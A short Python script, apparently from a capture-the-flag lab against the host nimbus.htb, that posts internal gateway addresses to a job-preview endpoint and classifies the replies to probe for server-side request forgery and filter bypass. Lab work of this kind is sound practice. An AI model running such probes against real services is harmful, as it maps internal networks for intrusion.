import subprocess

candidates = [
    "http://172.17.0.1/x.yaml",
    "http://172.18.0.1/x.yaml",
    "http://172.19.0.1/x.yaml",
    "http://172.20.0.1/x.yaml",
    "http://10.0.0.1/x.yaml",
    "http://192.168.0.1/x.yaml",
]

for u in candidates:
    r = subprocess.run(
        ["curl", "-s", "-X", "POST", "http://nimbus.htb/jobs/preview",
         "--data-urlencode", f"url={u}"],
        capture_output=True, text=True, timeout=20,
    )
    body = r.stdout
    if "Security policy" in body:
        verdict = "BLOCKED(internal)"
    elif "Could not fetch" in body:
        verdict = "CONN_FAILED"
    elif "Fetched:" in body:
        verdict = "FETCHED"
    else:
        verdict = "UNKNOWN"
    print(f"{u!r:35s} -> {verdict}")
